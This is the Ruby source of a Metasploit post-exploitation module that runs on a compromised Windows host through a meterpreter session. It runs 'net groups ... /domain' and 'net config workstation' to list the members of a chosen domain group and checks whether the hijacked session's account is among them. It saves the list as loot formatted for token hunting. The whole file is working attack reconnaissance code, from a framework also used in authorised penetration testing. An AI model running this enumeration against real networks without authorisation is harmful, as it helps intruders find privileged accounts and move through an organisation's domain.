##
# $Id$
##

##
# ## This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'
require 'rex'
require 'msf/core/post/common'
require 'msf/core/post/windows/registry'

class Metasploit3 < Msf::Post

	include Msf::Post::Common

	def initialize(info={})
		super( update_info( info,
				'Name'          => 'Enumerate Domain Group',
				'Description'   => %q{ Extracts user accounts from specified group
					and stores the results in the loot. Will also verify if session
					account is in the group. Data is stored in loot in a format that
					is compatible with the token_hunter plugin. May get unexpected
					results if this module is not with domain credentials.},
				'License'       => MSF_LICENSE,
				'Author'        => [ 'Carlos Perez <carlos_perez[at]darkoperator.com>',
						'Stephen Haywood <haywoodsb[at]gmail.com>'],
				'Version'       => '$Revision$',
				'Platform'      => [ 'windows' ],
				'SessionTypes'  => [ 'meterpreter' ]
			))
		register_options(
			[
				OptString.new('GROUP', [true, 'Domain Group to enumerate', nil])

			], self.class)
	end

	# Run Method for when run command is issued
	def run
		print_status("Running module against #{sysinfo['Computer']}")
		
		cur_domain, cur_user = client.sys.config.getuid.split("\\")
		ltype = "domain.group.members"
		ctype = "text/plain"
		usr_cmd = 'net groups "' + datastore['GROUP'] + '" /domain'
		dom_cmd = 'net config workstation'
		domain = ""
		
		usr_res = cmd_exec(usr_cmd)
		dom_res = cmd_exec(dom_cmd)
		members = get_members(usr_res.split("\n"))
		domain = get_domain(dom_res.split("\n"))
		p dom_res
		# Show results if we have any, Error if we don't
		if ! members.empty?
			
			print_status("Found users in #{datastore['GROUP']}")
			
			loot = []
			members.each do |user|
				print_status("\t#{domain}\\#{user}")
				loot << "#{domain}\\#{user}"
			end
			
			# Is our current user a member of this domain and group
			if is_member(cur_domain, cur_user, domain, members)
				print_status("Current sessions running as #{cur_domain}\\#{cur_user} is a member of #{datastore['GROUP']}!!")
			else
				print_error("Current session running as #{cur_domain}\\#{cur_user} is not a member of #{datastore['GROUP']}")
			end

			# Store the captured data in the loot.
			loot_file = store_loot(ltype, ctype, session, loot.join("\n"), nil, datastore['GROUP'])
			print_status("User list stored in #{loot_file}")
		else
			print_error("No members found for #{datastore['GROUP']}")
		end

	end
	
	def get_members(results)
		members = []
		
		# Usernames start somewhere around line 6
		results = results.slice(6, results.length)
		# Get group members from the output
		results.each do |line|
			line.split("  ").compact.each do |user|
				next if user.strip == ""
				next if user =~ /-----/
				next if user =~ /The command completed successfully/
				members << user.strip 
			end
		end
		
		return members
	end
	
	def get_domain(results)
		domain = ''
		
		results.each do |line|
			if line =~ /Workstation domain \s+(.*)/ then domain = $1.strip end
		end
		
		return domain
	end
	
	def is_member(cur_dom, cur_user, dom, users)
		
		member = false
		
		if cur_dom == dom
			users.each do |u|
				if u.downcase == cur_user.downcase then member = true end
			end
		end
		
		return member
	end
	
end
